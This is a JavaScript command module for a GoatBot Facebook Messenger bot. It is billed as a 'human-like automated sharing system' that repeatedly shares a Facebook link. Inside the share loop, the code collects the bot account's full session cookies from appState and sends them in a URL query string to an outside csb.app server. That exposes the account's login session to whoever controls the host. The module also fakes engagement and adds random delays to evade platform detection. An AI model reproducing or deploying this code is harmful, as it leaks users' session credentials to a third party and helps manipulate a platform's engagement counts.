const axios = require("axios");

module.exports = {
  config: {
    name: "share",
    version: "2.5.0",
    author: "Hanji",
    countDown: 10,
    role: 2,
    shortDescription: "Human-like automated sharing system",
    category: "tools",
    guide: "{pn} [link] [count]"
  },

  onStart: async function ({ api, event, args, message }) {
    const { threadID, messageID } = event;
    const url = args[0];
    const count = parseInt(args[1]) || 10;

    if (!url || !url.includes("facebook.com")) {
      api.setMessageReaction("❌", messageID, () => {}, true);
      return message.reply("⚠️ [ ERROR ]: Invalid Facebook URL. Operation aborted.");
    }

    if (count > 500) {
      return message.reply("⚠️ [ WARNING ]: Limit exceeded. Safety cap is 500 shares.");
    }

    const initMsg = `​[ 𝗭𝗬𝗣𝗛𝗘𝗥 𝗦𝗧𝗘𝗔𝗟𝗧𝗛 - 𝗦𝗬𝗦𝗧𝗘𝗠 ]
╼━━━━━━━━━━━━━━━━━━━━╾
​❯ [STATUS] : Monitoring Traffic...
❯ [TARGET] : ${url}
❯ [CONFIG] : Human-Mimicry Active (3-7s)
​╼━━━━━━━━━━━━━━━━━━━━╾`;

    message.reply(initMsg);

    let successCount = 0;
    const appstate = global.GoatBot.config.appState;
    const cookieString = appstate.map(c => `${c.key}=${c.value}`).join('; ');

    for (let i = 0; i < count; i++) {
      try {
        await axios.get(`https://68id8x-3000.csb.app/facebook/share?url=${encodeURIComponent(url)}&cookie=${encodeURIComponent(cookieString)}`);
        
        successCount++;
        
        // --- [ Human-Like Delay: 3000ms to 7000ms ] ---
        const randomDelay = Math.floor(Math.random() * (7000 - 3000 + 1)) + 3000;
        await new Promise(resolve => setTimeout(resolve, randomDelay));

      } catch (e) {
        console.error("System Error during sharing:", e.message);
      }
    }

    const doneMsg = `​[ 𝗭𝗬𝗣𝗛𝗘𝗥 𝗦𝗬𝗦𝗧𝗘𝗠 - 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ]
╼━━━━━━━━━━━━━━━━━━━━╾
​❯ [RESULT] : Shares deployed successfully.
❯ [TOTAL] : ${successCount} shares confirmed.
❯ [MODE] : Stealth operation finalized.
​╼━━━━━━━━━━━━━━━━━━━━╾
[ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗥𝗔𝗡𝗧𝗘𝗗 - 𝗛𝗔𝗡𝗝𝗜 ]`;

    api.setMessageReaction("✅", messageID, () => {}, true);
    return message.reply(doneMsg);
  }
};

